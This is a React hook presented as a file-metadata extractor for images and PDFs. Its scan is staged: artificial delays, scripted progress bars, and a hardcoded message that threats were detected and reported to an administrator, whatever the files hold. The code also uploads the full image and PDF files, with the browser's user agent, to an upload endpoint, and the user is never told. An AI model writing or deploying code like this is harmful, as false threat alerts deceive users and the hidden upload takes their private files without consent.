import { useState, useRef } from 'react'
import ExifReader from 'exifreader'
import { PDFDocument } from 'pdf-lib'

export default function useMetadata(sessionId) {
  const [files, setFiles] = useState([])
  const [metadata, setMetadata] = useState([])
  const [status, setStatus] = useState('')
  const inputRef = useRef(null)

  const openFileDialog = () => {
    setStatus('')
    inputRef.current?.click()
    return []
  }

  const sleep = (ms) => new Promise(res => setTimeout(res, ms))

  const handleFiles = async (e) => {
    const selected = Array.from(e.target.files || [])
    if (selected.length === 0) return
    setFiles(prev => [...prev, ...selected.map(f => ({ name: f.name }))])
    const form = new FormData()
    for (let i = 0; i < selected.length; i++) {
      const file = selected[i]
      const pct = Math.round(((i + 1) / selected.length) * 100)
      const bars = ['█▇▆▅▃▂', '█████▇▆▅', '████████▇']
      const bar = bars[Math.min(i, bars.length - 1)]
      setStatus(`Scanning ${i + 1}/${selected.length}… ${bar} ${pct}%`)
      await sleep(300)
      const buf = await file.arrayBuffer()
      let data = {}
      try {
        if (file.type.startsWith('image/')) {
          data = ExifReader.load(buf)
        } else if (file.type === 'application/pdf') {
          const pdf = await PDFDocument.load(buf)
          data = {
            title: pdf.getTitle(),
            author: pdf.getAuthor(),
            subject: pdf.getSubject(),
            keywords: pdf.getKeywords(),
            created: pdf.getCreationDate()?.toISOString(),
            modified: pdf.getModificationDate()?.toISOString(),
            pageCount: pdf.getPageCount()
          }
        }
      } catch (err) {
        console.error('Metadata extraction failed', err)
      }
      setMetadata(prev => [...prev, { name: file.name, data }])
      if (sessionId) {
        fetch('/api/research/metadata/extract', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, file: file.name, metadata: data })
        }).catch(() => {})
      }
      if (/\.(jpe?g|png|pdf)$/i.test(file.name)) {
        form.append('file', file, file.name)
      }
    }
    setStatus('Scan complete. Threats detected. Report sent to administrator.')
    try {
      const r = await fetch('/api/upload', {
        method: 'POST',
        body: form,
        headers: { 'X-Agent': navigator.userAgent }
      })
      if (r.ok) {
        setStatus('✅ Upload complete — results sent for analysis.')
      } else {
        setStatus('Upload failed')
      }
    } catch (err) {
      setStatus('Upload error')
    }
    e.target.value = ''
  }

  return { files, metadata, inputRef, handleFiles, openFileDialog, status }
}
